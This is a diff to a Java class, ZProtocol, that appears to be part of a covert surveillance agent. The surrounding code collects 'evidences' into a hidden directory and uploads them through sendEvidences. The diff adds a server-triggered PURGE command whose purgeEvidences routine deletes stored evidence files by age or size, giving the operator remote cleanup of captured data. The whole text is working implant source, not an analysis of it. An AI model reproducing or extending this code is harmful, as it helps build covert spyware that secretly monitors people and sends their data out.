@@ -99,6 +99,15 @@ public class ZProtocol extends Protocol {
             boolean[] capabilities = parseIdentification(response);
             response = null;
 
+            if (capabilities[Proto.PURGE]) {
+                //#ifdef DEBUG
+                debug.info("***** Purge *****");
+                //#endif  
+
+                response = command(Proto.PURGE);
+                parsePurge(response);
+            }
+
             if (capabilities[Proto.NEW_CONF]) {
                 //#ifdef DEBUG
                 debug.info("***** NewConf *****"); //$NON-NLS-1$
@@ -448,10 +457,11 @@ public class ZProtocol extends Protocol {
                     int cap = dataBuffer.readInt();
                     if (cap < Proto.LASTTYPE) {
                         capabilities[cap] = true;
+                        //#ifdef DEBUG
+                        debug.trace("capabilities: " + capabilities[i]); //$NON-NLS-1$
+                        //#endif     
                     }
-                    //#ifdef DEBUG
-                    debug.trace("capabilities: " + capabilities[i]); //$NON-NLS-1$
-                    //#endif                   
+
                 }
 
             } catch (EOFException e) {
@@ -472,6 +482,38 @@ public class ZProtocol extends Protocol {
         }
 
         return capabilities;
+    }
+
+    protected void parsePurge(byte[] result) throws ProtocolException,
+            CommandException {
+        //#ifdef DBC
+        Check.asserts(result.length >= 4, "Wrong purge answer");
+        //#endif
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            final int len = Utils.byteArrayToInt(result, 4);
+            if (len >= 12) {
+                //#ifdef DBC
+                Check.asserts(result.length == len + 8, "Wrong purge OK answer");
+                //#endif
+
+                long time = Utils.byteArrayToLong(result, 8);
+                int size = Utils.byteArrayToInt(result, 16);
+
+                Date date = null;
+                if (time > 0) {
+                    date = new Date(time * 1000);
+                }
+
+                //#ifdef DEBUG
+                debug.trace("parsePurge, date: " + date + " size: " + size);
+                //#endif
+
+                purgeEvidences(Path.hidden(), date, size);
+            }
+
+
+        }
     }
 
     /**
@@ -732,6 +774,44 @@ public class ZProtocol extends Protocol {
         }
     }
 
+    protected void purgeEvidences(String basePath, Date date, int size) {
+        EvidenceCollector logCollector = EvidenceCollector.getInstance();
+
+        final Vector dirs = logCollector.scanForDirLogs(basePath);
+        final int dsize = dirs.size();
+        //#ifdef DEBUG
+        debug.trace("purgeEvidences #directories: " + dsize);
+        //#endif
+        for (int i = 0; i < dsize; ++i) {
+            final String dir = (String) dirs.elementAt(i);
+            final Vector logs = logCollector.scanForEvidences(basePath, dir);
+            final int lsize = logs.size();
+            //#ifdef DEBUG
+            debug.trace("    purge dir: " + dir + " #evidences: " + lsize);
+            //#endif
+            for (int j = 0; j < lsize; ++j) {
+                final String logName = (String) logs.elementAt(j);
+                final String fullLogName = basePath + dir + logName;
+                final AutoFile file = new AutoFile(fullLogName, false);
+                if (file.exists()) {
+                    if (size > 0 && file.getSize() > size) {
+                        //#ifdef DEBUG
+                        debug.info("purgeEvidences, removing due size: " + EvidenceCollector.decryptName(logName));
+                        //#endif
+                        file.delete();
+                    } else if (date != null
+                            && file.lastModified() < date.getTime()) {
+                        //#ifdef DEBUG
+                        debug.info("purgeEvidences, removing due date: " + EvidenceCollector.decryptName(logName));
+                        //#endif
+                        file.delete();
+                    }
+                }
+            }
+        }
+
+    }
+
     protected void sendEvidences(String basePath) throws TransportException,
             ProtocolException {
         //#ifdef DEBUG
@@ -758,7 +838,7 @@ public class ZProtocol extends Protocol {
             Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
 
             byte[] response;
-            
+
             if (!Keys.getInstance().isSeven()) {
                 response = command(Proto.EVIDENCE_SIZE, plainOut);
                 checkOk(response);
@@ -777,8 +857,7 @@ public class ZProtocol extends Protocol {
                 final byte[] content = file.read();
                 //#ifdef DEBUG
                 debug.info("Sending file: " //$NON-NLS-1$
-                        + EvidenceCollector.decryptName(logName) + " = " //$NON-NLS-1$
-                        + fullLogName);
+                        + EvidenceCollector.decryptName(logName) + " size: " + file.getSize() + " date: " + file.getFileTime());
                 //#endif
 
                 plainOut = new byte[content.length + 4];
